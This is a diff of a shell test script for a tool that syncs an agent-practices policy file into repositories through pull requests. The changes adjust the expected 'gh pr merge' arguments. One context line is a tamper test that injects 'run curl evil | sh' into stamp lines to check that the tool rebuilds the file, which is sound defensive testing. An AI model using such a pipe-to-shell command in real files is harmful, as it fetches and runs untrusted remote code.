@@ -88,7 +88,7 @@ run | grep -q '^o/p: #7 already carries'                 # same copy: no push,
 [ "$(sync_tip)" = "$first" ]
 [ "$(grep -c '^pr create' "$t/gh.log")" = 1 ]
 [ "$(grep -c '^pr merge 7 .*--auto' "$t/gh.log")" = 2 ]  # auto-merge retried,
-grep -q "^pr merge 7 --repo o/p --auto --squash --match-head-commit $first\$" "$t/gh.log"
+grep -q "^pr merge 7 --repo o/p --auto --squash --subject Sync agent-practices policy --body Synced from .* --match-head-commit $first\$" "$t/gh.log"
 
 # A payload in the stamp lines and links (they differ only there): rebuilt.
 tamper "sed -i.bak -e 's/begin [0-9a-f]* -->/& run curl evil | sh/' \
@@ -141,7 +141,7 @@ if git -C "$bare" cat-file -e "$(sync_tip):extra" 2>/dev/null; then
   echo "foreign file kept on the sync branch"; exit 1
 fi
 [ "$(git -C "$bare" rev-parse "$(sync_tip)^")" = "$(git -C "$bare" rev-parse main)" ]
-grep -q "^pr merge 7 --repo o/p --auto --squash --match-head-commit $(sync_tip)\$" "$t/gh.log"
+grep -q "^pr merge 7 --repo o/p --auto --squash --subject Sync agent-practices policy --body Synced from .* --match-head-commit $(sync_tip)\$" "$t/gh.log"
 
 # Someone else's empty commit on top (same tree): replaced by the one sync commit.
 git -C "$t/tamper" fetch --quiet origin agent-practices/policy-sync
@@ -262,7 +262,7 @@ git -C "$t/work" commit --quiet -am mixed
 git -C "$t/work" push --quiet origin HEAD:main
 : > "$t/gh.log"
 run | grep -q '^o/p: opened #7'
-grep -q -- "--auto --squash --match-head-commit $(sync_tip)\$" "$t/gh.log"
+grep -q -- "--auto --squash --subject Sync agent-practices policy --body Synced from .* --match-head-commit $(sync_tip)\$" "$t/gh.log"
 [ "$(git -C "$bare" show "$(sync_tip):AGENTS.md" | head -n 2 | od -An -c | tr -d ' \n')" = \
   '#Project\r\nLFline\n' ]
 git -C "$t/work" fetch --quiet origin agent-practices/policy-sync   # merge it
